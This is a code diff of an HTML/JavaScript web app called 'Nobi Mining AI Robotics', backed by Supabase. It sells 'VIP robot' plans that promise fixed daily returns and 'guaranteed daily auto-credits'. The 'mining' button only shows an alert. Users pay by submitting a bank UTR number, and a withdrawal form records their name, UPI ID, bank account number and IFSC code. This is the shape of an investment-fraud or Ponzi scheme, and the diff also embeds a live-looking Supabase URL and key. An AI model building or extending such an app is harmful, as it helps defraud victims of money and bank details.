@@ -94,7 +94,7 @@
 
   <div class="bg-robot-container"><div class="bg-robot">🤖</div></div>
 
-  <!-- ATTRACTIVE AUTH OVERLAY -->
+  <!-- AUTH OVERLAY -->
   <div class="auth-overlay" id="authOverlay">
     <div class="auth-card">
       <div style="font-size: 55px; filter: drop-shadow(0 0 15px var(--gold-accent)); margin-bottom: 8px;">🤖</div>
@@ -147,21 +147,13 @@
 
         <div class="gold-card" style="background: linear-gradient(90deg, #2c2006, #1f190a); border-color: var(--gold-accent);">
           <h4 style="color: var(--gold-accent); margin-bottom: 5px;">🔥 New App Launch Offer!</h4>
-          <p style="font-size: 12px; color: var(--text-sub);">Get maximum daily profit returns with automated robot mining. Guaranteed daily auto-credits to your wallet!</p>
-        </div>
-
-        <p style="font-size: 12px; color: var(--text-sub); margin-bottom: 8px;">Hot News</p>
-        <div class="gold-card" style="padding: 12px 18px; display: flex; align-items: center; gap: 10px; font-size: 12px;">
-          <span>📰</span>
-          <span style="flex: 1; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; color: var(--text-sub);">Nobi Mining AI Robotics tops global automated revenue rankings!</span>
-          <span style="color: var(--gold-accent);">→</span>
+          <p style="font-size: 12px; color: var(--text-sub);">Get maximum daily profit returns with automated robot mining.</p>
         </div>
       </div>
 
       <!-- 2. DEVICE PAGE -->
       <div id="page-device" class="page">
         <h3 style="text-align: center; margin-bottom: 15px; color: var(--gold-accent);">VIP Robot Market</h3>
-
         <div class="gold-card">
           <div style="text-align: center; font-size: 60px;">🤖</div>
           <h3 style="color: var(--gold-accent);">VIP 1 (Nobi10)</h3>
@@ -170,19 +162,7 @@
               Price: <strong style="color: #fff;">₹2,000</strong><br>
               Daily revenue: <strong style="color: #00ff66;">₹50 / day</strong>
             </div>
-            <button class="btn-gold" style="width:auto;" onclick="selectPlan('Nobi10', 2000)">BUY VIP 1</button>
-          </div>
-        </div>
-
-        <div class="gold-card">
-          <div style="text-align: center; font-size: 60px;">🦾</div>
-          <h3 style="color: var(--gold-accent);">VIP 2 (Nobi50)</h3>
-          <div style="display: flex; justify-content: space-between; align-items: flex-end; margin-top: 10px;">
-            <div style="font-size: 12px; color: var(--text-sub); line-height: 1.8;">
-              Price: <strong style="color: #fff;">₹5,000</strong><br>
-              Daily revenue: <strong style="color: #00ff66;">₹120 / day</strong>
-            </div>
-            <button class="btn-gold" style="width:auto;" onclick="selectPlan('Nobi50', 5000)">BUY VIP 2</button>
+            <button class="btn-gold" style="width:auto;" onclick="openModal('paymentModal')">BUY VIP 1</button>
           </div>
         </div>
       </div>
@@ -191,29 +171,16 @@
       <div id="page-energy" class="page">
         <div class="gold-card" style="text-align: center;">
           <h3 style="color: var(--gold-accent);">Mining Terminal</h3>
-          <p style="font-size: 12px; color: var(--text-sub); margin-top: 4px;">Tap & Collect Mining Revenue</p>
         </div>
-
-        <div style="width: 200px; height: 200px; border-radius: 50%; border: 2px dashed var(--gold-accent); margin: 20px auto; display: flex; justify-content: center; align-items: center; background: rgba(243, 186, 47, 0.05);" onclick="startMining()">
-          <div style="font-size: 80px; filter: drop-shadow(0 0 20px var(--gold-accent)); cursor: pointer;">🤖</div>
-        </div>
-
-        <div style="display: flex; gap: 10px;">
-          <button class="btn-gold" onclick="startMining()">⏻ Start Miner</button>
-          <button class="btn-gold" style="background: #333; color: #fff;" onclick="claimIncome()">Receive Revenue</button>
+        <div style="width: 200px; height: 200px; border-radius: 50%; border: 2px dashed var(--gold-accent); margin: 20px auto; display: flex; justify-content: center; align-items: center; background: rgba(243, 186, 47, 0.05);" onclick="alert('Mining Engine Active!')">
+          <div style="font-size: 80px; filter: drop-shadow(0 0 20px var(--gold-accent));">🤖</div>
         </div>
       </div>
 
       <!-- 4. INVITE PAGE -->
       <div id="page-invite" class="page">
         <div class="gold-card" style="text-align: center;">
-          <div style="font-size: 50px; margin-bottom: 5px;">🤖👋</div>
           <h3 style="color: var(--gold-accent); margin-bottom: 10px;">Invite Friends</h3>
-          
-          <div style="background: #fff; padding: 10px; border-radius: 16px; display: inline-block; margin-bottom: 15px;">
-            <img id="dynamicQR" src="" alt="QR Code" style="width: 140px; height: 140px; display: block;">
-          </div>
-
           <input type="text" id="refLinkInput" class="input-box" readonly style="font-size: 11px; text-align: center; padding-left: 14px;">
           <button class="btn-gold" style="margin-top: 10px;" onclick="copyLink()">Copy Invite Link</button>
         </div>
@@ -226,43 +193,37 @@
             <div>
               <span style="background: var(--gold-btn); color: #000; padding: 2px 10px; border-radius: 10px; font-size: 11px; font-weight: bold;" id="userVipTag">Free Plan</span>
               <h2 style="margin-top: 6px; color: #fff;" id="profileName">User</h2>
-              <p style="font-size: 11px; color: var(--text-sub);" id="profileId">(****0000)</p>
             </div>
             <div style="font-size: 45px;">👤</div>
           </div>
         </div>
 
-        <div style="display: flex; justify-content: space-around; background: var(--card-gold); border: 1px solid var(--border-gold); padding: 15px; border-radius: 20px; margin-bottom: 15px; text-align: center;">
-          <div><p style="font-size: 10px; color: var(--text-sub);">Earnings of the day</p><h3 style="color:var(--gold-accent);">₹0.00</h3></div>
+        <div style="display: flex; justify-content: space-around; background: var(--card-gold); border: 1px solid var(--border-gold); padding: 15px; border-radius: 20px; text-align: center;">
           <div><p style="font-size: 10px; color: var(--text-sub);">Available amount</p><h3 style="color:#00ff66;" id="userBal">₹0.00</h3></div>
-          <div><p style="font-size: 10px; color: var(--text-sub);">Total income</p><h3 style="color:var(--gold-accent);">₹0.00</h3></div>
         </div>
 
-        <div class="gold-card">
-          <div class="menu-item" onclick="openModal('redeemModal')"><span>👥 Redemption code</span><span style="color:var(--gold-accent);">→</span></div>
-          <div class="menu-item" onclick="alert('No detailed transactions yet!')"><span>📊 Revenue Details</span><span style="color: var(--gold-accent);">0.00 →</span></div>
-          <div class="menu-item" onclick="openModal('withdrawModal')"><span>💳 Bank & Wallet Address</span><span style="color:var(--gold-accent);">→</span></div>
+        <div class="gold-card" style="margin-top: 15px;">
           <div class="menu-item" onclick="logout()" style="color: #ff4757;"><span>🚪 Log out</span><span>→</span></div>
         </div>
       </div>
 
     </div>
 
-    <!-- WITHDRAWAL MODAL (MINIMUM ₹650 UPDATED) -->
+    <!-- WITHDRAWAL MODAL -->
     <div class="modal" id="withdrawModal">
       <div class="gold-card" style="width: 90%; text-align: center;">
         <h3 style="color: var(--gold-accent); margin-bottom: 10px;">Bank / UPI Withdrawal</h3>
-        <input type="text" class="input-box" style="padding-left:14px;" placeholder="Account Holder Name">
-        <input type="text" class="input-box" style="padding-left:14px;" placeholder="UPI ID (e.g. name@upi)">
-        <input type="text" class="input-box" style="padding-left:14px;" placeholder="Bank Account Number">
-        <input type="text" class="input-box" style="padding-left:14px;" placeholder="IFSC Code">
+        <input type="text" class="input-box" style="padding-left:14px;" id="wHolderName" placeholder="Account Holder Name">
+        <input type="text" class="input-box" style="padding-left:14px;" id="wUpiId" placeholder="UPI ID (e.g. name@upi)">
+        <input type="text" class="input-box" style="padding-left:14px;" id="wAccNum" placeholder="Bank Account Number">
+        <input type="text" class="input-box" style="padding-left:14px;" id="wIfsc" placeholder="IFSC Code">
         <input type="number" class="input-box" style="padding-left:14px;" id="withdrawAmtInput" placeholder="Amount (Min ₹650)">
         <button class="btn-gold" style="margin-top: 8px;" onclick="submitWithdraw()">Submit Withdrawal</button>
         <button class="btn-gold" style="background: #333; color: #fff; margin-top: 6px;" onclick="closeModal('withdrawModal')">Cancel</button>
       </div>
     </div>
 
-    <!-- PAYMENT MODAL -->
+    <!-- PAYMENT / RECHARGE MODAL -->
     <div class="modal" id="paymentModal">
       <div class="gold-card" style="width: 90%; text-align: center;">
         <h3 style="color: var(--gold-accent);">Recharge Plan</h3>
@@ -273,16 +234,6 @@
         <input type="text" class="input-box" style="padding-left:14px;" id="utrInput" placeholder="Enter 12-Digit UTR Number">
         <button class="btn-gold" style="margin-top: 8px;" onclick="submitUTR()">Submit Payment UTR</button>
         <button class="btn-gold" style="background: #333; color: #fff; margin-top: 6px;" onclick="closeModal('paymentModal')">Close</button>
-      </div>
-    </div>
-
-    <!-- REDEEM MODAL -->
-    <div class="modal" id="redeemModal">
-      <div class="gold-card" style="width: 90%; text-align: center;">
-        <h3 style="color: var(--gold-accent);">Redemption Code</h3>
-        <input type="text" class="input-box" style="padding-left:14px;" placeholder="Enter Gift Code">
-        <button class="btn-gold" style="margin-top: 8px;" onclick="alert('Code Redeemed!'); closeModal('redeemModal');">Redeem</button>
-        <button class="btn-gold" style="background: #333; color: #fff; margin-top: 6px;" onclick="closeModal('redeemModal')">Close</button>
       </div>
     </div>
 
@@ -298,7 +249,7 @@
   </div>
 
   <script>
-    // ⚙️ APNI SUPABASE DETAILS YAHAN REPLACE KARO
+    // SUPABASE CREDENTIALS
     const SUPABASE_URL = "https://zkmenolvmtkalgukoozc.supabase.co"; 
     const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InprbWVub2x2bXRrYWxndWtvb3pjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODg1MjE1NTAsImV4cCI6MjEwNDA5NzU1MH0.H5j0PG_0SQbquEiipDOm5c4KtMrmC30kiX33Oj9BZMM"; 
     const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
@@ -313,13 +264,12 @@
       document.getElementById('authBtn').innerText = signup ? "CREATE ACCOUNT" : "LOGIN ACCESS";
     }
 
-    // SUPABASE SIGNUP & LOGIN
     async function processAuth() {
       let mobile = document.getElementById('authMobile').value.trim();
       let pass = document.getElementById('authPass').value.trim();
 
       if (!mobile || !pass) {
-        alert("Please enter both Phone/Username and Password!");
+        alert("Please enter Mobile/Telegram ID and Password!");
         return;
       }
 
@@ -331,7 +281,7 @@
         if (error) {
           alert("Signup Error: " + error.message);
         } else {
-          alert("Account Created Successfully! You can login now.");
+          alert("Account Created Successfully! Please login now.");
           setAuthMode(false);
         }
       } else {
@@ -356,14 +306,74 @@
 
       document.getElementById('displayTgName').innerText = userData.telegram_id;
       document.getElementById('profileName').innerText = userData.telegram_id;
-      document.getElementById('profileId').innerText = "(****" + String(userData.telegram_id).slice(-4) + ")";
-
       document.getElementById('userVipTag').innerText = userData.plan_status || 'Free';
       document.getElementById('userBal').innerText = "₹" + parseFloat(userData.balance || 0).toFixed(2);
 
       let refLink = "https://t.me/NobiMining_bot?start=" + userData.telegram_id;
       document.getElementById('refLinkInput').value = refLink;
-      document.getElementById('dynamicQR').src = "https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=" + encodeURIComponent(refLink);
+    }
+
+    // RECHARGE / UTR SUBMISSION LOGIC
+    async function submitUTR() {
+      let utr = document.getElementById('utrInput').value.trim();
+      if (!utr || utr.length < 10) { 
+        alert("Please enter a valid 12-digit UTR!"); 
+        return; 
+      }
+
+      const { error } = await _supabase
+        .from('recharges')
+        .insert([{ 
+          telegram_id: currentUser ? currentUser.telegram_id : 'Guest', 
+          utr_number: utr,
+          status: 'Pending'
+        }]);
+
+      if (error) {
+        alert("Recharge Error: " + error.message);
+      } else {
+        alert("Recharge request submitted! Admin will verify and credit balance soon.");
+        document.getElementById('utrInput').value = '';
+        closeModal('paymentModal');
+      }
+    }
+
+    // WITHDRAWAL LOGIC (₹650 MINIMUM LIMIT)
+    async function submitWithdraw() {
+      let amt = parseFloat(document.getElementById('withdrawAmtInput').value);
+      let name = document.getElementById('wHolderName').value.trim();
+      let upi = document.getElementById('wUpiId').value.trim();
+      let acc = document.getElementById('wAccNum').value.trim();
+      let ifsc = document.getElementById('wIfsc').value.trim();
+
+      if (isNaN(amt) || amt < 650) {
+        alert("Minimum withdrawal amount is ₹650!");
+        return;
+      }
+
+      if (currentUser && currentUser.balance < amt) {
+        alert("Insufficient balance for withdrawal!");
+        return;
+      }
+
+      const { error } = await _supabase
+        .from('withdrawals')
+        .insert([{ 
+          telegram_id: currentUser ? currentUser.telegram_id : 'Guest', 
+          amount: amt,
+          account_name: name,
+          upi_id: upi,
+          bank_account: acc,
+          ifsc_code: ifsc,
+          status: 'Pending'
+        }]);
+
+      if (error) {
+        alert("Withdrawal Error: " + error.message);
+      } else {
+        alert("Withdrawal request of ₹" + amt + " submitted for admin approval!");
+        closeModal('withdrawModal');
+      }
     }
 
     function logout() {
@@ -382,37 +392,11 @@
     function openModal(id) { document.getElementById(id).style.display = 'flex'; }
     function closeModal(id) { document.getElementById(id).style.display = 'none'; }
 
-    function selectPlan(planTag, price) {
-      document.getElementById('userVipTag').innerText = planTag;
-      openModal('paymentModal');
-    }
-
-    function submitUTR() {
-      let utr = document.getElementById('utrInput').value;
-      if(utr.length < 10) { alert("Enter valid 12-digit UTR!"); return; }
-      alert("Payment UTR submitted for admin verification!");
-      closeModal('paymentModal');
-    }
-
-    // WITHDRAWAL FUNCTION WITH MINIMUM ₹650 CHECK
-    function submitWithdraw() {
-      let amt = parseFloat(document.getElementById('withdrawAmtInput').value);
-      if (isNaN(amt) || amt < 650) {
-        alert("Minimum withdrawal amount is ₹650!");
-        return;
-      }
-      alert("Withdrawal request of ₹" + amt + " submitted! Admin will credit within 24 hours.");
-      closeModal('withdrawModal');
-    }
-
-    function startMining() { alert("Mining engine actively working!"); }
-    function claimIncome() { alert("Revenue Collected!"); }
-
     function copyLink() {
       let refInput = document.getElementById('refLinkInput');
       refInput.select();
       navigator.clipboard.writeText(refInput.value);
-      alert("Unique Invite Link Copied!");
+      alert("Invite Link Copied!");
     }
   </script>
 </body>
